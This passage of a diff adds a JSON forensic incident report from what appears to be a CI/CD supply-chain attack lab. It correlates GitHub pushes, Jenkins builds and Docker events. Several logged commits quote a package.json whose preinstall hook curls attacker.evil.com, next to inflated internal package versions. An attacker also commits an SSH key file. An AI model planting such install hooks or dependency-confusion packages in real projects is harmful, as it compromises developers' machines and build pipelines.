+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 24,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:09:07",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "d922161168e3a8c661c369a5e589a53582b7696a7b73c7bc5dde022b52d77e10",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 25,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:09:09",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+          "evidence_hash": "d8887b1295a954f8c141019589c2e3d73b891d93f7c182fc34e0a09e8b677921",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 26,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:09:21",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "a30c1956eae57093cad2a595621179debb26671abad50ca6ac2b2a41ac3cd337",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 27,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:12:22",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "d4c071a9a5725c2a068aa3587abcc54b972aa80b692e07b6947d3d25b9379cdf",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 28,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:12:41",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "df5c730dbb0e7d697199b6dd57bbbc973cc9c5272cda4a23e0e31bdd96e4a77c",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:47.243840",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "a63499e6b680c05cdc187f3f4dcf1cbfe036e3c87ec70596d4527814017bfb10",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:49.485927",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "94f6569177cf1e322faa683d1983397e044eb7a4cc3092f98086cd413f1acc99",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    }
+  ],
+  "events": [
+    {
+      "timestamp": "2026-02-19T06:12:41",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+      "evidence_hash": "df5c730dbb0e7d697199b6dd57bbbc973cc9c5272cda4a23e0e31bdd96e4a77c",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:25",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: ",
+      "evidence_hash": "04fe36e1987213d9e97daa006adaac79634460ec7c10005162110dc91fb9dfe4",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:22",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+      "evidence_hash": "d4c071a9a5725c2a068aa3587abcc54b972aa80b692e07b6947d3d25b9379cdf",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T06:09:21",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+      "evidence_hash": "a30c1956eae57093cad2a595621179debb26671abad50ca6ac2b2a41ac3cd337",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T06:09:09",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+      "evidence_hash": "d8887b1295a954f8c141019589c2e3d73b891d93f7c182fc34e0a09e8b677921",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T06:09:07",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+      "evidence_hash": "d922161168e3a8c661c369a5e589a53582b7696a7b73c7bc5dde022b52d77e10",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T06:08:19",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update Jenkinsfile\n, Files: ",
+      "evidence_hash": "b50464cf4f4f94c5ddd97b90f86f58cad3fc86ef32ea4737852cad754a9b2693",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T06:08:18",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update Dockerfile\n, Files: ",
+      "evidence_hash": "e731c8fe3c70426f2904c865c2cb2944c978319328acefd5ff4fa469acb11f7e",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T06:08:18",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update package.json\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app for DPFF attack lab\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\"\n  },\n  \"dependencies\": {}\n}\n",
+      "evidence_hash": "5acbb3cdbc6054275e0bfffb81315ab148b992ae71af87d7322749e1d1bc9d01",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T06:08:17",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update app.js\n, Files: ",
+      "evidence_hash": "df11f8b2347482391d2654d514b1e5cf6fdfdf100d9c591913cf966081e4537f",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:54:10",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+      "evidence_hash": "e82f6e0532f4a6114f20c1896f4048ea54b7368a20af6b6dabc443642dc627a2",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:53:57",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+      "evidence_hash": "6871112a44569e807c6306ddde6f43b4df12fdfe4ec7d769e410cda42a6bf1a2",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:53:55",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+      "evidence_hash": "175bc231c76a00646fbcf96598987430cf38323b772e23012b1ecadf7dd26b08",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:53:38",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update Jenkinsfile\n, Files: ",
+      "evidence_hash": "a49291d93ddcb6d55b3eb41bb227cf3a2ca39492fb7c617bd36bac101639754a",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:53:37",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update Dockerfile\n, Files: ",
+      "evidence_hash": "718c3d4b52470db2405af9f1313cd07ba447c391191ca2f75e211b1601b62774",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:53:36",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update package.json\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app for DPFF attack lab\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\"\n  },\n  \"dependencies\": {}\n}\n",
+      "evidence_hash": "f7f5e55602d7c5adaf49513f2641bc209bfc597363a9be3d7cff5eb00c8a574f",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:53:35",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update app.js\n, Files: ",
+      "evidence_hash": "5cee270c7635f4265708ae04dc66002e0e2db54718909e52c629af322bb1122d",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:12",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+      "evidence_hash": "017d0142c1f1141ef04a040390854692fb89df9e135e7da6b7d124efcd5c30d1",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:47:59",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: ",
+      "evidence_hash": "d0957ca38e056d274a68d9128585839fc0eb7d58dbc82fff061ca02422760955",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:47:57",
+      "source": "GitHub",
+      "event_type": "git.push",
+      "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Add deployment key\n, Files: credentials/id_rsa",
+      "evidence_hash": "f33202554969d708efdf6e7b830dfefe45abb9ec9ae514ea3642c7befb48f286",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:42:53.523000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-01-injection, Build: #8, Result: FAILURE",
+      "evidence_hash": "e2be2396fffa548a430701b08d0f50577bedf04a0ab9f40a7a642421c6f29200",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:42:30.793000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-01-injection, Build: #7, Result: FAILURE",
+      "evidence_hash": "98471021feaad0dd80ffb5d59f663705dba3c3d5abb357ca4d85929e003c1e98",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:39:32.134000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-01-injection, Build: #6, Result: FAILURE",
+      "evidence_hash": "50d6183b28adf30d1b87db4f119ce167d1a672cc0358c4120fd630116d3bebf5",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:39:13.767000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-01-injection, Build: #5, Result: FAILURE",
+      "evidence_hash": "44c053878b5b3144e132958410f9a8a33af6093aa085363977a30348b2f7a6b8",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:27:24.446000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-01-injection, Build: #4, Result: FAILURE",
+      "evidence_hash": "6340f13dc7c40f3ffca9c947a6eedcc591443065a5573de32b98891d7f5fb583",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:27:10.992000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-01-injection, Build: #3, Result: FAILURE",
+      "evidence_hash": "1c6f2c843816f1b8008d04c8b765a4948c69f8ea10ee41ed37109ca83061bc09",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:24:20.796000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-01-injection, Build: #2, Result: FAILURE",
+      "evidence_hash": "7abdd1de450da3f0126ecf9d79194ffae5052dea96f9287c5e00f477b2b1338c",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:24:04.990000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-01-injection, Build: #1, Result: FAILURE",
+      "evidence_hash": "3c6a821de5e271cd0e4f0ba12100cf3e3b3b98a123d1f9b8e0fe9a717c8d7f01",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:42:43.522000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-05-obfuscation, Build: #3, Result: FAILURE",
+      "evidence_hash": "55b711d011b4db53e1827f4f4eb42a727ae903347a8db66ce54773954090f900",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:39:22.132000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-05-obfuscation, Build: #2, Result: FAILURE",
+      "evidence_hash": "28252de418d5a35d5bbb4cb82689f1228736313b6ed84f7ed7daa74292fe3861",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:24:10.793000",
+      "source": "Jenkins",
+      "event_type": "Build",
+      "details": "Job: dpff-attack-05-obfuscation, Build: #1, Result: FAILURE",
+      "evidence_hash": "a610a8f2cba8bf2b23f461a53700c0bd394fdf7223e8758fe449c10390a6a815",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T11:24:10.793000",
+      "source": "Jenkins",
+      "event_type": "Step Execution",
+      "details": "Job: dpff-attack-05-obfuscation, Line 17: + base64 -d",
+      "evidence_hash": "2368a5bfd38db65758afba51893e18dc5c540d4d26a728e3880f5e3d60200be1",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:27:33.211367",
+      "source": "Docker",
+      "event_type": "Image pull",
+      "details": "Type: image, Action: pull, ID: registry:2, Name: registry",
+      "evidence_hash": "b8b2765bdc53e75d4528b87dc06587cfa5641c3b7d32f433095e9743f337825e",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:27:34.433520",
+      "source": "Docker",
+      "event_type": "Image pull",
+      "details": "Type: image, Action: pull, ID: gitea/gitea:, Name: gitea/gitea",
+      "evidence_hash": "dfdd48e23eadc4f7517dd55e7ba6b0878f8610dfd4c1de7ca2f763638e77e687",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:29:07.132984",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:80721, Name: sha256:807216ecc46ef046d1ad5c5f4c0bc5971462275fe3b4cfbf9b2da7f46239b041",
+      "evidence_hash": "5c0dbb108c9b7fb19208550fc0e8a2808c1525d2d12cca864a32e09029c604a1",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:29:07.154807",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:80721, Name: lab-jenkins:latest",
+      "evidence_hash": "a54616bc90c0b838fd25742d1fae83849f15fcc52abe6a9f0ec11e732a0f7e85",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:29:08.397950",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: a0b4f2bcbf14, Name: dpff-gitea",
+      "evidence_hash": "04b160723cb7e1f24159d7d311dc740353c66d230cedaf9fa08321ab9dc53dfc",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:29:08.406250",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 05eb2c315cde, Name: dpff-registry",
+      "evidence_hash": "7caabfe1d71a516fcc2fcb642bfb2196fe809c1316731069591e402cf9926c2b",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:29:08.535847",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 85d7fb0908d8, Name: dpff-jenkins",
+      "evidence_hash": "2627a3fd53e6b51ee04940ae1d5d02d7852e6adb86550072a547e4d358351eb2",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:29:09.163845",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: a0b4f2bcbf14, Name: dpff-gitea",
+      "evidence_hash": "b0aa8cd824c5c36ff61c8415b5f6d71a956d499c312439b8f25f8db09fec1aca",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:29:09.189106",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 05eb2c315cde, Name: dpff-registry",
+      "evidence_hash": "37bd9e08611ce8ea38396a9525d3993d13eaf320399e49c40e23e67bd1a843e4",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:33:44.581347",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:1bf93, Name: sha256:1bf931bf1e82bce408b29d17ff5437bfa5da117f98c66b5ac6e49b5290ad3e41",
+      "evidence_hash": "612443758fdf207d172583040117d6412dcdfb443b109e1856bd5d3db07751dc",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:33:44.601429",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:1bf93, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "4e11491d7b1e8fed40cc6d80b9a67e78985ddfd3e2965505dae34ed042fdce76",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:33:45.842643",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "d37a216e6204e4660fd37ce3d09ef59214c4557fd20ec3c9fc422f6fa4a99d45",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:33:48.370577",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:d5dbf, Name: sha256:d5dbfb5bf753f02af48a912cb76ebddbc89ab12613f195ee68e4c95000f0bec9",
+      "evidence_hash": "fa3e728437ad2bbc049720d9cdcd0e5924dd3d23a86caf80b303636513fcf7da",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:33:48.389229",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:d5dbf, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "a69c5a63ea6f0bbda772a6ffa07de740d4576783d3369ae47fc440c48e2a3253",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:33:49.567636",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "28b2e7cd4acf748c634f56c259e86371f597157143265de0d03839b2519d0067",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:01.919172",
+      "source": "Docker",
+      "event_type": "Image pull",
+      "details": "Type: image, Action: pull, ID: alpine:lates, Name: alpine",
+      "evidence_hash": "31a4274da973094666c4426ca077302962b4a08ced7f7391dd56175fd37b958f",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:02.110770",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 990a1e71281a, Name: dpff-attack-06-privileged",
+      "evidence_hash": "013c4ee28de9aef335abe4b7677548f38c7076187e59068fc68268086d196302",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:02.375113",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 990a1e71281a, Name: dpff-attack-06-privileged",
+      "evidence_hash": "a14983b68af359d75b8904feaba609911d5883f3d7d6779c68bf5778e9e6985d",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:02.693352",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 33338cbcc5f4, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "37d7cf73c28f5ee8c7166fc1486558b8005bd846bc6cecc7e39d253e379c5b42",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:02.917145",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 33338cbcc5f4, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "79b35cb12eddfdf044ba93880252a78ad29aecbd11a9fe6cc229f4521985c47e",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:09.467413",
+      "source": "Docker",
+      "event_type": "Image create",
